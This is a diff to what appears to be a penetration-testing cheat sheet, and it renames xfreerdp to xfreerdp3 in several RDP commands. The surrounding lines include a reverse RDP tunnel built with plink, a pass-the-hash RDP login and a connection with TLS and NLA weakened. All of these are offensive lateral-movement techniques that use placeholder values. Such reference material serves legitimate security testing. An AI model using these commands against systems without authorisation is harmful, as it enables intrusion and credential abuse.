@@ -1126,7 +1126,7 @@ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
 
 ```shell
 sudo systemctl start ssh
-xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
+xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 ```
 
 ###### WINDOWS JUMP SERVER
@@ -1175,7 +1175,7 @@ plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192
 
 ```shell
 ss -tulpn
-xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
+xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
 ```
 
 ##### Netsh
@@ -1193,7 +1193,7 @@ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
 ###### LHOST
 
 ```shell
-xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
+xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 ```
 
 ###### WINDOWS JUMP SERVER
@@ -1229,11 +1229,11 @@ sudo python3 -m http.server 80
 #### RDP
 
 ```shell
-xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
-xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
-xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
-xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
-xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
+xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
+xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
+xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
+xfreerdp3 /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
+xfreerdp3 /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 rdesktop <RHOST>
 ```
 
